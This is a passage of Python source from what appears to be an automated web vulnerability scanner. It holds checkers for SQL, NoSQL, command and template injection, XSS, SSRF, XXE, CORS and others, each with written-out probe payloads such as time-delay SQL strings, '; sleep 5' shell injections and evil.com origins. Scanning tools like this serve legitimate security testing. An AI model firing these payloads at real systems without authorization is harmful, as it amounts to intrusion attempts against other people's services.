                            "type":  inp.get("type", "text"),
                            "value": inp.get("value", ""),
                        })
                info.forms.append({"action": action, "method": method, "inputs": inputs})
                if inputs and action:
                    for inp in inputs:
                        info.params[action].add(inp["name"])

            # Script src (JS endpoint extraction)
            for script in soup.find_all("script", src=True):
                src = script["src"]
                if src.endswith(".js"):
                    full = src if src.startswith("http") else base + src
                    self._extract_js_endpoints(info, full)
        except Exception:
            pass

    def _extract_js_endpoints(self, info: SubdomainInfo, js_url: str):
        r = self.http.get(js_url)
        if not r:
            return
        patterns = [
            r"""["'`](/(?:api|v\d|graphql|rest)[^"'`\s)]+)""",
            r"""url\s*[:=]\s*["'`]([^"'`]+)""",
            r"""endpoint\s*[:=]\s*["'`]([^"'`]+)""",
            r"""path\s*[:=]\s*["'`]([^"'`]+)""",
            r"""fetch\s*\(\s*["'`]([^"'`]+)""",
            r"""axios\.[a-z]+\s*\(\s*["'`]([^"'`]+)""",
        ]
        for pat in patterns:
            for m in re.finditer(pat, r.text):
                ep = m.group(1)
                if ep.startswith("/") and len(ep) < 200:
                    info.endpoints.add(ep.split("?")[0])

    def _base_url(self, info: SubdomainInfo) -> Optional[str]:
        for scheme in ("https://", "http://"):
            r = self.http.head(scheme + info.fqdn)
            if r and r.status_code < 500:
                return scheme + info.fqdn
        return None

# ─── Vulnerability Checkers ─────────────────────────────────────────────────────

def _make_id() -> str:
    return hashlib.md5(str(time.time_ns()).encode()).hexdigest()[:12]

def _marker() -> str:
    return "autobbv5-" + "".join(random.choices(string.hexdigits, k=8)).lower()

class VulnChecker:
    def __init__(self, http: HTTPEngine, notify_cb: Callable = None):
        self.http   = http
        self.notify = notify_cb or (lambda *a, **k: None)

    def _finding(self, **kwargs) -> Finding:
        return Finding(
            id=_make_id(),
            references=[],
            request="", response="",
            verified=False, false_positive=False,
            **kwargs
        )


class SQLInjectionChecker(VulnChecker):
    def check(self, base: str, path: str, params: Set[str]) -> List[Finding]:
        findings = []
        url = base + path
        
        # Get baseline response first for comparison
        try:
            baseline = self.http.get(url, params={list(params)[0]: "normalvalue123"} if params else {})
            baseline_len = len(baseline.text) if baseline else 0
        except:
            baseline_len = 0

        for param in list(params)[:5]:  # Limit to 5 params per endpoint
            # Phase 1: Error-based detection
            error_payloads = ["'", "\"", "1'", "1\"", "' OR '1'='1", "' AND '1'='2"]
            
            for payload in error_payloads:
                r = self.http.get(url, params={param: payload})
                if not r:
                    continue
                body = r.text or ""

                # Check for SQL errors
                found_error = None
                for pattern in Payloads.SQLI_ERRORS:
                    if re.search(pattern, body, re.IGNORECASE):
                        found_error = pattern
                        break
                
                if found_error:
                    # Verify with multiple payloads to reduce FP
                    verify_count = 0
                    for verify_payload in ["' AND '1'='1", "1' AND '1'='1"]:
                        r_verify = self.http.get(url, params={param: verify_payload})
                        if r_verify and any(re.search(p, r_verify.text, re.I) for p in Payloads.SQLI_ERRORS):
                            verify_count += 1
                    
                    if verify_count >= 1:  # At least 1 verification
                        f = self._finding(
                            vuln_type   = "SQL Injection (Error-Based)",
                            severity    = Severity.CRITICAL,
                            target      = base, subdomain=base.split("//")[-1],
                            endpoint    = path, param=param,
                            description = f"Error-based SQL injection in parameter `{param}` - database errors exposed",
                            evidence    = f"SQL error pattern matched: {found_error[:100]}",
                            payload     = payload,
                            request     = f"GET {url}?{param}={urllib.parse.quote(payload)}",
                            response    = body[:500],
                            cvss=9.8, cwe="CWE-89",
                            remediation = "Use parameterized queries / prepared statements. Never concatenate user input into SQL strings.",
                            confidence  = 0.95,
                            references  = [
                                "https://owasp.org/www-community/attacks/SQL_Injection",
                                "https://portswigger.net/web-security/sql-injection",
                                "https://cwe.mitre.org/data/definitions/89.html",
                            ],
                        )
                        findings.append(f)
                        self.notify(f"[CRITICAL] SQL Injection (error-based) on {base}{path} [{param}]", "CRITICAL")
                        break  # Found SQLi in this param, move to next

            # Phase 2: Boolean-based blind detection
            if not any(f.param == param for f in findings):  # Skip if already found
                try:
                    # True condition
                    r_true = self.http.get(url, params={param: "1' OR '1'='1'--"})
                    # False condition  
                    r_false = self.http.get(url, params={param: "1' OR '1'='2'--"})
                    
                    if r_true and r_false:
                        true_len = len(r_true.text)
                        false_len = len(r_false.text)
                        
                        # Significant difference indicates boolean-based SQLi
                        if abs(true_len - false_len) > 100 and abs(true_len - baseline_len) > 100:
                            f = self._finding(
                                vuln_type   = "SQL Injection (Boolean-Based Blind)",
                                severity    = Severity.CRITICAL,
                                target=base, subdomain=base.split("//")[-1],
                                endpoint=path, param=param,
                                description = f"Boolean-based blind SQL injection in `{param}`",
                                evidence    = f"True condition: {true_len} bytes, False condition: {false_len} bytes (diff: {abs(true_len-false_len)})",
                                payload     = "1' OR '1'='1'--",
                                cvss=9.5, cwe="CWE-89",
                                remediation = "Use parameterized queries. Implement proper input validation.",
                                confidence  = 0.88,
                                references  = ["https://portswigger.net/web-security/sql-injection/blind"],
                            )
                            findings.append(f)
                            self.notify(f"[CRITICAL] SQL Injection (boolean-blind) on {base}{path} [{param}]", "CRITICAL")
                except:
                    pass

            # Phase 3: Time-based blind detection (most reliable)
            if not any(f.param == param for f in findings):
                time_payloads = [
                    ("' AND SLEEP(5)--", "MySQL"),
                    ("'; WAITFOR DELAY '0:0:5'--", "MSSQL"),
                    ("' AND pg_sleep(5)--", "PostgreSQL"),
                ]
                
                for payload, db_type in time_payloads:
                    t0 = time.time()
                    r  = self.http.get(url, params={param: payload})
                    elapsed = time.time() - t0
                    
                    # Verify delay is significant and consistent
                    if r and elapsed >= 4.5:
                        # Double-check with another request
                        t0_verify = time.time()
                        r_verify = self.http.get(url, params={param: payload})
                        elapsed_verify = time.time() - t0_verify
                        
                        # Both must show delay
                        if elapsed_verify >= 4.5:
                            f = self._finding(
                                vuln_type   = f"SQL Injection (Time-Based Blind - {db_type})",
                                severity    = Severity.CRITICAL,
                                target=base, subdomain=base.split("//")[-1],
                                endpoint=path, param=param,
                                description = f"Time-based blind SQL injection in `{param}` (avg delay {(elapsed+elapsed_verify)/2:.1f}s)",
                                evidence    = f"Response delayed {elapsed:.1f}s with payload `{payload}` (verified: {elapsed_verify:.1f}s)",
                                payload     = payload,
                                request     = f"GET {url}?{param}={urllib.parse.quote(payload)}",
                                response    = "",
                                cvss=9.8, cwe="CWE-89",
                                remediation = "Use parameterized queries. Implement query timeouts to prevent time-based attacks.",
                                confidence  = 0.95,
                                references  = ["https://portswigger.net/web-security/sql-injection/blind"],
                            )
                            findings.append(f)
                            self.notify(f"[CRITICAL] SQL Injection (time-blind {db_type}) on {base}{path} delay={elapsed:.1f}s", "CRITICAL")
                            break  # Found time-based, skip other DB payloads
        
        return findings


class XSSChecker(VulnChecker):
    def check(self, base: str, path: str, params: Set[str]) -> List[Finding]:
        findings = []
        url = base + path
        
        for param in list(params)[:5]:  # Limit params tested
            marker = _marker()
            
            # Phase 1: Test reflection
            test_payloads = [
                f"<{marker}>",
                f"<script>{marker}</script>",
                f"<img src=x onerror={marker}>",
            ]
            
            reflected = False
            for test in test_payloads:
                r = self.http.get(url, params={param: test})
                if r and marker in (r.text or ""):
                    reflected = True
                    break
            
            if not reflected:
                continue
            
            # Phase 2: Test actual XSS payloads
            xss_payloads = [
                f"<script>alert('{marker}')</script>",
                f"<img src=x onerror=alert('{marker}')>",
                f"<svg onload=alert('{marker}')>",
                f"\" autofocus onfocus=alert('{marker}') x=\"",
                f"' autofocus onfocus=alert('{marker}') x='",
            ]
            
            for xss_payload in xss_payloads:
                r2 = self.http.get(url, params={param: xss_payload})
                if not r2 or marker not in (r2.text or ""):
                    continue
                
                ctx = self._context(r2.text, marker)
                
                # Verify it's actually exploitable (not encoded)
                html_encoded = xss_payload.replace('<', '&lt;').replace('>', '&gt;')
                
                # Check if raw payload appears (unencoded)
                is_exploitable = xss_payload in r2.text and html_encoded not in r2.text
                
                # Check Content-Type
                is_html = 'text/html' in r2.headers.get('Content-Type', '')
                
                if is_exploitable and is_html:
                    confidence = 0.85
                    if ctx == "script":
                        confidence = 0.95
                    elif ctx == "event-handler":
                        confidence = 0.92
                    
                    f = self._finding(
                        vuln_type   = f"Reflected XSS ({ctx} context)",
                        severity    = Severity.HIGH,
                        target=base, subdomain=base.split("//")[-1],
                        endpoint=path, param=param,
                        description = f"Reflected XSS in parameter `{param}` - payload executes in {ctx} context",
                        evidence    = f"Payload reflected without encoding: `{xss_payload[:80]}`",
                        payload     = xss_payload,
                        request     = f"GET {url}?{param}={urllib.parse.quote(xss_payload)}",
                        response    = r2.text[:500],
                        cvss=7.4, cwe="CWE-79",
                        remediation = f"Encode all output for {ctx} context. Implement Content Security Policy (CSP). Use modern frameworks with auto-escaping.",
                        confidence  = confidence,
                        references  = [
                            "https://owasp.org/www-community/attacks/xss/",
                            "https://portswigger.net/web-security/cross-site-scripting",
                            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
                        ],
                    )
                    findings.append(f)
                    self.notify(f"[HIGH] XSS ({ctx}) on {base}{path} [{param}] conf={confidence:.0%}", "HIGH")
                    break  # Found XSS, move to next param
            
        return findings

    def _context(self, html: str, mark: str) -> str:
        idx = html.find(mark)
        if idx == -1:
            return "unknown"
        before = html[max(0, idx-100):idx]
        if re.search(r'<script[^>]*>', before, re.IGNORECASE):
            return "script"
        if re.search(r'on\w+=[\'"]\s*$', before):
            return "event-handler"
        if re.search(r'=[\'"]\s*$', before):
            return "attribute"
        return "html"


class SSRFChecker(VulnChecker):
    def check(self, base: str, path: str, params: Set[str]) -> List[Finding]:
        findings = []
        url = base + path
        for param in params:
            for payload in Payloads.SSRF[:10]:
                r = self.http.get(url, params={param: payload})
                if not r:
                    continue
                body = r.text or ""
                # Cloud metadata signatures
                if any(sig in body for sig in ["ami-id", "instance-id", "iam", "security-credentials",
                                                "computeMetadata", "latest/meta-data",
                                                "root:x:", "127.0.0.1", "169.254"]):
                    f = self._finding(
                        vuln_type   = "Server-Side Request Forgery (SSRF)",
                        severity    = Severity.HIGH,
                        target=base, subdomain=base.split("//")[-1],
                        endpoint=path, param=param,
                        description = f"SSRF in `{param}` — internal resource accessed",
                        evidence    = f"Payload `{payload}` → response contains internal data",
                        payload     = payload,
                        request     = f"GET {url}?{param}={urllib.parse.quote(payload)}",
                        response    = body[:500],
                        cvss=8.6, cwe="CWE-918",
                        remediation = "Validate/allowlist URLs. Block internal IP ranges. Disable unnecessary URL fetching.",
                        confidence  = 0.88,
                        references  = [
                            "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                            "https://portswigger.net/web-security/ssrf",
                        ],
                    )
                    findings.append(f)
                    self.notify(f"[HIGH] SSRF on {base}{path} [{param}] via {payload}", "HIGH")
                    break
        return findings


class SSTIChecker(VulnChecker):
    def check(self, base: str, path: str, params: Set[str]) -> List[Finding]:
        findings = []
        url = base + path
        for param in params:
            for payload in Payloads.SSTI:
                r = self.http.get(url, params={param: payload})
                if not r:
                    continue
                body = r.text or ""
                # 7*7=49 detection
                if "49" in body and payload in ("{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}"):
                    engine = self._detect_engine(payload)
                    f = self._finding(
                        vuln_type   = f"Server-Side Template Injection ({engine})",
                        severity    = Severity.HIGH,
                        target=base, subdomain=base.split("//")[-1],
                        endpoint=path, param=param,
                        description = f"SSTI in `{param}` — template engine: {engine}",
                        evidence    = f"Expression `{payload}` evaluated to 49",
                        payload     = payload,
                        request     = f"GET {url}?{param}={urllib.parse.quote(payload)}",
                        response    = body[:500],
                        cvss=8.8, cwe="CWE-94",
                        remediation = "Never render user input in templates. Use sandboxed environments.",
                        confidence  = 0.95,
                        references  = [
                            "https://portswigger.net/research/server-side-template-injection",
                            "https://cwe.mitre.org/data/definitions/94.html",
                        ],
                    )
                    findings.append(f)
                    self.notify(f"[HIGH] SSTI ({engine}) on {base}{path} [{param}]", "HIGH")
                    break
        return findings

    def _detect_engine(self, payload: str) -> str:
        return {
            "{{7*7}}": "Jinja2/Twig", "${7*7}": "FreeMarker/Velocity",
            "<%= 7*7 %>": "ERB/EJS", "#{7*7}": "Ruby",
            "*{7*7}": "Spring SpEL",
        }.get(payload, "Unknown")


class PathTraversalChecker(VulnChecker):
    UNIX_SIGS = ["root:x:", "daemon:x:", "/bin/bash", "/usr/bin/"]
    WIN_SIGS  = ["[fonts]", "[extensions]", "[mci extensions]", "for 16-bit app support"]

    def check(self, base: str, path: str, params: Set[str]) -> List[Finding]:
        findings = []
        url = base + path
        for param in params:
            for payload in Payloads.PATH_TRAVERSAL:
                r = self.http.get(url, params={param: payload})
                if not r:
                    continue
                body = r.text or ""
                sigs = self.UNIX_SIGS + self.WIN_SIGS
                hit  = next((s for s in sigs if s in body), None)
                if hit:
                    f = self._finding(
                        vuln_type   = "Path Traversal / LFI",
                        severity    = Severity.HIGH,
                        target=base, subdomain=base.split("//")[-1],
                        endpoint=path, param=param,
                        description = f"Path traversal in `{param}` — file contents leaked",
                        evidence    = f"Signature `{hit}` found in response",
                        payload     = payload,
                        request     = f"GET {url}?{param}={urllib.parse.quote(payload)}",
                        response    = body[:500],
                        cvss=7.5, cwe="CWE-22",
                        remediation = "Validate file paths. Use allowlists. Chroot/jail processes.",
                        confidence  = 0.97,
                        references  = ["https://owasp.org/www-community/attacks/Path_Traversal"],
                    )
                    findings.append(f)
                    self.notify(f"[HIGH] Path Traversal on {base}{path} [{param}]", "HIGH")
                    break
        return findings


class OpenRedirectChecker(VulnChecker):
    def check(self, base: str, path: str, params: Set[str]) -> List[Finding]:
        findings = []
        url = base + path
        redirect_params = {p for p in params if any(
            kw in p.lower() for kw in ["url","redirect","next","return","dest","go","link","target","redir","ref"]
        )}
        for param in redirect_params:
            for payload in Payloads.OPEN_REDIRECT[:6]:
                r = self.http.get(url, params={param: payload}, allow_redirects=False)
                if r and r.status_code in (301, 302, 303, 307, 308):
                    loc = r.headers.get("Location", "")
                    if "evil.com" in loc or loc == payload:
                        f = self._finding(
                            vuln_type   = "Open Redirect",
                            severity    = Severity.MEDIUM,
                            target=base, subdomain=base.split("//")[-1],
                            endpoint=path, param=param,
                            description = f"Open redirect in `{param}` → {loc}",
                            evidence    = f"Redirected to `{loc}` using payload `{payload}`",
                            payload     = payload,
                            request     = f"GET {url}?{param}={urllib.parse.quote(payload)}",
                            response    = f"HTTP {r.status_code} Location: {loc}",
                            cvss=6.1, cwe="CWE-601",
                            remediation = "Validate redirect URLs against allowlist. Use relative paths.",
                            confidence  = 0.93,
                            references  = ["https://cwe.mitre.org/data/definitions/601.html"],
                        )
                        findings.append(f)
                        self.notify(f"[MEDIUM] Open Redirect on {base}{path} [{param}]", "MEDIUM")
                        break
        return findings


class SecurityHeadersChecker(VulnChecker):
    REQUIRED = {
        "Content-Security-Policy":      (Severity.MEDIUM, 5.5, "CWE-693", "Add Content-Security-Policy header to prevent XSS/data-injection."),
        "X-Frame-Options":              (Severity.MEDIUM, 4.3, "CWE-1021","Add X-Frame-Options: DENY or SAMEORIGIN to prevent clickjacking."),
        "X-Content-Type-Options":       (Severity.LOW,    3.7, "CWE-16",  "Add X-Content-Type-Options: nosniff."),
        "Strict-Transport-Security":    (Severity.MEDIUM, 5.9, "CWE-319", "Add HSTS header with long max-age and includeSubDomains."),
        "Referrer-Policy":              (Severity.LOW,    3.1, "CWE-200", "Add Referrer-Policy to control referrer leakage."),
        "Permissions-Policy":           (Severity.LOW,    2.5, "CWE-16",  "Add Permissions-Policy to restrict browser features."),
        "X-XSS-Protection":             (Severity.LOW,    3.0, "CWE-79",  "Add X-XSS-Protection: 1; mode=block."),
    }
    DANGEROUS = {
        "X-Powered-By":   (Severity.INFO, 2.0, "CWE-200", "Remove X-Powered-By to avoid technology fingerprinting."),
        "Server":         (Severity.INFO, 1.5, "CWE-200", "Suppress Server header version information."),
    }

    def check(self, base: str, info: SubdomainInfo) -> List[Finding]:
        findings = []
        hdrs = {k.lower(): v for k, v in info.headers.items()}
        url  = base + "/"

        for hdr, (sev, cvss, cwe, remediation) in self.REQUIRED.items():
            if hdr.lower() not in hdrs:
                f = self._finding(
                    vuln_type   = f"Missing Security Header: {hdr}",
                    severity    = sev,
                    target=base, subdomain=info.fqdn,
                    endpoint="/", param="",
                    description = f"Header `{hdr}` is absent from HTTP responses.",
                    evidence    = f"No `{hdr}` header in response headers.",
                    payload="", request=f"GET {url}", response="",
                    cvss=cvss, cwe=cwe,
                    remediation = remediation,
                    confidence  = 1.0,
                    references  = ["https://owasp.org/www-project-secure-headers/"],
                )
                findings.append(f)

        for hdr, (sev, cvss, cwe, remediation) in self.DANGEROUS.items():
            if hdr.lower() in hdrs:
                f = self._finding(
                    vuln_type   = f"Information Disclosure via {hdr}",
                    severity    = sev,
                    target=base, subdomain=info.fqdn,
                    endpoint="/", param="",
                    description = f"Header `{hdr}: {hdrs[hdr.lower()]}` reveals technology info.",
                    evidence    = f"{hdr}: {hdrs[hdr.lower()]}",
                    payload="", request=f"GET {url}", response="",
                    cvss=cvss, cwe=cwe,
                    remediation = remediation,
                    confidence  = 1.0,
                    references  = ["https://owasp.org/www-project-secure-headers/"],
                )
                findings.append(f)
        return findings


class CORSChecker(VulnChecker):
    def check(self, base: str, info: SubdomainInfo) -> List[Finding]:
        findings = []
        url = base + "/"

        test_origins = ["https://evil.com", "https://evil." + info.fqdn.split(".", 1)[-1],
                        "null", f"https://{info.fqdn}.evil.com"]

        for origin in test_origins:
            r = self.http.get(url, headers={"Origin": origin})
            if not r:
                continue
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")

            if acao == "*" and acac.lower() == "true":
                sev, cvss, desc = Severity.HIGH, 8.1, "Wildcard ACAO with credentials — dangerous combo"
            elif acao == origin and origin != "null":
                sev, cvss, desc = Severity.HIGH, 7.5, f"Arbitrary origin `{origin}` reflected in ACAO"
            elif acao == "null":
                sev, cvss, desc = Severity.MEDIUM, 6.5, "Null origin reflected — sandbox bypass possible"
            elif acao == "*":
                sev, cvss, desc = Severity.LOW, 3.5, "ACAO: * (no credentials, lower risk)"
            else:
                continue

            f = self._finding(
                vuln_type   = "CORS Misconfiguration",
                severity    = sev,
                target=base, subdomain=info.fqdn,
                endpoint="/", param="",
                description = desc,
                evidence    = f"Origin: {origin}\nAccess-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}",
                payload     = origin,
                request     = f"GET {url}\nOrigin: {origin}",
                response    = f"ACAO: {acao}\nACAC: {acac}",
                cvss=cvss, cwe="CWE-942",
                remediation = "Use allowlist of trusted origins. Never reflect arbitrary origins. Avoid ACAO:* with credentials.",
                confidence  = 0.95,
                references  = ["https://portswigger.net/web-security/cors", "https://cwe.mitre.org/data/definitions/942.html"],
            )
            findings.append(f)
            self.notify(f"[{sev.label}] CORS misconfiguration on {info.fqdn} ({desc[:60]})", sev.label)
            break
        return findings


class SSLChecker(VulnChecker):
    def check(self, info: SubdomainInfo, ssl_info: Dict) -> List[Finding]:
        findings = []
        base = f"https://{info.fqdn}"

        if ssl_info.get("error"):
            f = self._finding(
                vuln_type   = "SSL/TLS Certificate Error",
                severity    = Severity.HIGH,
                target=base, subdomain=info.fqdn,
                endpoint="/", param="",
                description = f"SSL/TLS error: {ssl_info['error']}",
                evidence    = ssl_info["error"],
                payload="", request=f"TLS handshake {info.fqdn}:443", response="",
                cvss=7.4, cwe="CWE-295",
                remediation = "Renew/fix SSL certificate. Use valid CA-signed certificate.",
                confidence  = 1.0,
                references  = ["https://cwe.mitre.org/data/definitions/295.html"],
            )
            findings.append(f)
            return findings

        ssl_analyzer = SSLAnalyzer()
        if ssl_analyzer.expired(ssl_info):
            f = self._finding(
                vuln_type   = "Expired SSL Certificate",
                severity    = Severity.HIGH,
                target=base, subdomain=info.fqdn,
                endpoint="/", param="",
                description = f"SSL certificate expired on {ssl_info.get('not_after', 'unknown')}",
                evidence    = f"notAfter: {ssl_info.get('not_after', '')}",
                payload="", request="", response="",
                cvss=7.5, cwe="CWE-298",
                remediation = "Renew the SSL certificate immediately.",
                confidence  = 1.0,
                references  = [],
            )
            findings.append(f)
            self.notify(f"[HIGH] Expired SSL cert on {info.fqdn}", "HIGH")

        if ssl_analyzer.weak_protocol(ssl_info):
            proto = ssl_info.get("protocol", "Unknown")
            f = self._finding(
                vuln_type   = f"Weak TLS Protocol ({proto})",
                severity    = Severity.HIGH,
                target=base, subdomain=info.fqdn,
                endpoint="/", param="",
                description = f"Weak TLS protocol `{proto}` supported",
                evidence    = f"Negotiated protocol: {proto}",
                payload="", request="", response="",
                cvss=7.4, cwe="CWE-326",
                remediation = "Disable SSLv2/3, TLS 1.0, TLS 1.1. Enforce TLS 1.2+ only.",
                confidence  = 1.0,
                references  = ["https://cwe.mitre.org/data/definitions/326.html"],
            )
            findings.append(f)
        return findings


class CMDInjectionChecker(VulnChecker):
    def check(self, base: str, path: str, params: Set[str]) -> List[Finding]:
        findings = []
        url = base + path
        for param in params:
            for payload in ["; sleep 5", "| sleep 5", "&& sleep 5", "$(sleep 5)", "`sleep 5`"]:
                t0 = time.time()
                r  = self.http.get(url, params={param: f"1{payload}"})
                elapsed = time.time() - t0
                if r and elapsed >= 4.5:
                    f = self._finding(
                        vuln_type   = "Command Injection (Time-Based)",
                        severity    = Severity.CRITICAL,
                        target=base, subdomain=base.split("//")[-1],
                        endpoint=path, param=param,
                        description = f"OS command injection in `{param}` (delay {elapsed:.1f}s)",
                        evidence    = f"Server slept {elapsed:.1f}s with `{payload}`",
                        payload     = payload,
                        request     = f"GET {url}?{param}=1{urllib.parse.quote(payload)}",
                        response    = "",
                        cvss=9.8, cwe="CWE-78",
                        remediation = "Never pass user input to shell commands. Use safe APIs. Whitelist input.",
                        confidence  = 0.90,
                        references  = ["https://owasp.org/www-community/attacks/Command_Injection"],
                    )
                    findings.append(f)
                    self.notify(f"[CRITICAL] Command Injection on {base}{path} [{param}] delay={elapsed:.1f}s", "CRITICAL")
                    break
        return findings


class IDORChecker(VulnChecker):
    def check(self, base: str, path: str, params: Set[str]) -> List[Finding]:
        findings = []
        url = base + path
        id_params = {p for p in params if any(
            kw in p.lower() for kw in ["id","uid","user","account","order","doc","file","record","item","profile"]
        )}
        for param in id_params:
            # First request with ID=1
            r1 = self.http.get(url, params={param: "1"})
            if not r1 or r1.status_code != 200 or len(r1.text or "") < 50:
                continue
            # Second with ID=2
            r2 = self.http.get(url, params={param: "2"})
            if not r2 or r2.status_code != 200:
                continue
            # If both return valid, potentially unique data
            if r1.text != r2.text and len(r2.text) > 50:
                f = self._finding(
                    vuln_type   = "Insecure Direct Object Reference (IDOR)",
                    severity    = Severity.HIGH,
                    target=base, subdomain=base.split("//")[-1],
                    endpoint=path, param=param,
                    description = f"IDOR in `{param}` — different objects accessible by changing ID",
                    evidence    = f"?{param}=1 and ?{param}=2 return different valid responses",
                    payload     = "2",
                    request     = f"GET {url}?{param}=2",
                    response    = r2.text[:300],
                    cvss=7.5, cwe="CWE-639",
                    remediation = "Implement authorization checks for every object access. Use indirect references.",
                    confidence  = 0.65,
                    references  = ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References"],
                )
                findings.append(f)
                self.notify(f"[HIGH] Potential IDOR on {base}{path} [{param}]", "HIGH")
        return findings


class SensitiveFilesChecker(VulnChecker):
    FILES = {
        "/.env":                  ("Environment Variables Exposed",   Severity.CRITICAL, 9.1, "CWE-200"),
        "/.env.local":            ("Environment Variables Exposed",   Severity.CRITICAL, 9.1, "CWE-200"),
        "/.env.production":       ("Environment Variables Exposed",   Severity.CRITICAL, 9.1, "CWE-200"),
        "/.git/config":           ("Git Repository Exposed",          Severity.HIGH,     7.5, "CWE-200"),
        "/.git/HEAD":             ("Git Repository Exposed",          Severity.HIGH,     7.5, "CWE-200"),
        "/config.json":           ("Configuration File Exposed",      Severity.HIGH,     7.1, "CWE-200"),
        "/config.yml":            ("Configuration File Exposed",      Severity.HIGH,     7.1, "CWE-200"),
        "/wp-config.php.bak":     ("WordPress Config Backup",         Severity.CRITICAL, 9.1, "CWE-200"),
        "/phpinfo.php":           ("PHP Info Exposed",                Severity.MEDIUM,   5.3, "CWE-200"),
        "/server-status":         ("Apache Server Status Exposed",    Severity.MEDIUM,   5.3, "CWE-200"),
        "/actuator/env":          ("Spring Actuator Env Exposed",     Severity.HIGH,     7.5, "CWE-200"),
        "/actuator/dump":         ("Spring Actuator Thread Dump",     Severity.HIGH,     7.5, "CWE-200"),
        "/swagger.json":          ("API Documentation Exposed",       Severity.LOW,      3.5, "CWE-200"),
        "/openapi.json":          ("API Documentation Exposed",       Severity.LOW,      3.5, "CWE-200"),
        "/api-docs":              ("API Documentation Exposed",       Severity.LOW,      3.5, "CWE-200"),
        "/graphql":               ("GraphQL Endpoint Exposed",        Severity.LOW,      3.5, "CWE-200"),
        "/admin":                 ("Admin Panel Exposed",             Severity.MEDIUM,   5.4, "CWE-425"),
        "/phpmyadmin":            ("phpMyAdmin Exposed",              Severity.HIGH,     7.5, "CWE-425"),
        "/adminer.php":           ("Adminer DB GUI Exposed",          Severity.HIGH,     7.5, "CWE-425"),
        "/.DS_Store":             ("macOS Metadata Leaked",           Severity.LOW,      3.0, "CWE-200"),
        "/backup.zip":            ("Backup Archive Exposed",          Severity.CRITICAL, 9.1, "CWE-200"),
        "/db.sql":                ("Database Dump Exposed",           Severity.CRITICAL, 9.8, "CWE-200"),
        "/dump.sql":              ("Database Dump Exposed",           Severity.CRITICAL, 9.8, "CWE-200"),
    }

    def check(self, base: str, info: SubdomainInfo) -> List[Finding]:
        findings = []

        def probe(path):
            r = self.http.get(base + path)
            if r and r.status_code == 200 and len(r.text or "") > 0:
                return path, r
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
            for result in ex.map(probe, self.FILES.keys()):
                if result:
                    path, r = result
                    title, sev, cvss, cwe = self.FILES[path]
                    f = self._finding(
                        vuln_type   = title,
                        severity    = sev,
                        target=base, subdomain=info.fqdn,
                        endpoint=path, param="",
                        description = f"`{path}` returns HTTP 200 — {title.lower()}",
                        evidence    = r.text[:300],
                        payload="", request=f"GET {base}{path}", response=r.text[:300],
                        cvss=cvss, cwe=cwe,
                        remediation = f"Restrict access to `{path}`. Remove sensitive files from webroot.",
                        confidence  = 0.99,
                        references  = ["https://owasp.org/www-project-web-security-testing-guide/"],
                    )
                    findings.append(f)
                    self.notify(f"[{sev.label}] {title} at {base}{path}", sev.label)
        return findings


class CSRFChecker(VulnChecker):
    def check(self, base: str, info: SubdomainInfo) -> List[Finding]:
        findings = []
        for form in info.forms:
            if form.get("method") != "POST":
                continue
            inputs = form.get("inputs", [])
            has_csrf_token = any(
                re.search(r"csrf|token|nonce|_token|authenticity", i.get("name",""), re.IGNORECASE)
                for i in inputs
            )
            if not has_csrf_token:
                action = form.get("action", "/")
                f = self._finding(
                    vuln_type   = "Cross-Site Request Forgery (CSRF)",
                    severity    = Severity.MEDIUM,
                    target=base, subdomain=info.fqdn,
                    endpoint=action, param="",
                    description = f"POST form at `{action}` missing CSRF token",
                    evidence    = f"Form inputs: {[i['name'] for i in inputs]}",
                    payload="", request=f"POST {base}{action}", response="",
                    cvss=6.5, cwe="CWE-352",
                    remediation = "Add synchronizer token or double-submit cookie. Use SameSite=Strict cookies.",
                    confidence  = 0.70,
                    references  = ["https://owasp.org/www-community/attacks/csrf"],
                )
                findings.append(f)
                self.notify(f"[MEDIUM] CSRF on {base}{action}", "MEDIUM")
        return findings


class XXEChecker(VulnChecker):
    def check(self, base: str, info: SubdomainInfo) -> List[Finding]:
        findings = []
        # Check all endpoints that accept XML
        for path in info.endpoints:
            if not any(kw in path for kw in ["/xml", "/soap", "/api", "/upload", "/import", "/parse"]):
                continue
            url = base + path
            for payload in Payloads.XXE[:2]:
                r = self.http.post(url, data=payload,
                                    headers={"Content-Type": "application/xml"})
                if not r:
                    continue
                body = r.text or ""
                if any(sig in body for sig in ["root:x:", "daemon:", "bin/bash", "[fonts]"]):
                    f = self._finding(
                        vuln_type   = "XML External Entity (XXE)",
                        severity    = Severity.HIGH,
                        target=base, subdomain=info.fqdn,
                        endpoint=path, param="body",
                        description = "XXE injection — file contents leaked via XML entity",
                        evidence    = body[:500],
                        payload     = payload[:200],
                        request     = f"POST {url}\nContent-Type: application/xml\n\n{payload[:200]}",
                        response    = body[:300],
                        cvss=8.2, cwe="CWE-611",
                        remediation = "Disable external entity processing. Use JAXP with XXE disabled. Validate XML input.",
                        confidence  = 0.95,
                        references  = ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
                    )
                    findings.append(f)
                    self.notify(f"[HIGH] XXE on {base}{path}", "HIGH")
                    break
        return findings


class NoSQLInjectionChecker(VulnChecker):
    """MongoDB and NoSQL injection"""
    def check(self, base: str, path: str, params: Set[str]) -> List[Finding]:
        findings = []
        url = base + path
        
        nosql_payloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            'admin\' || \'1==1',
        ]
        
        for param in list(params)[:3]:
            # Get baseline
            r_baseline = self.http.get(url, params={param: "normal123"})
            baseline_len = len(r_baseline.text) if r_baseline else 0
            
            for payload in nosql_payloads:
                r = self.http.get(url, params={param: payload})
                if r and abs(len(r.text) - baseline_len) > 500:
                    # Significant response difference - likely bypassed auth/filter
                    f = self._finding(
                        vuln_type   = "NoSQL Injection",
                        severity    = Severity.CRITICAL,
                        target=base, subdomain=base.split("//")[-1],
                        endpoint=path, param=param,
                        description = f"NoSQL injection in `{param}` - authentication/filtering bypassed",
                        evidence    = f"Payload caused {len(r.text) - baseline_len} byte response difference",
                        payload     = payload,
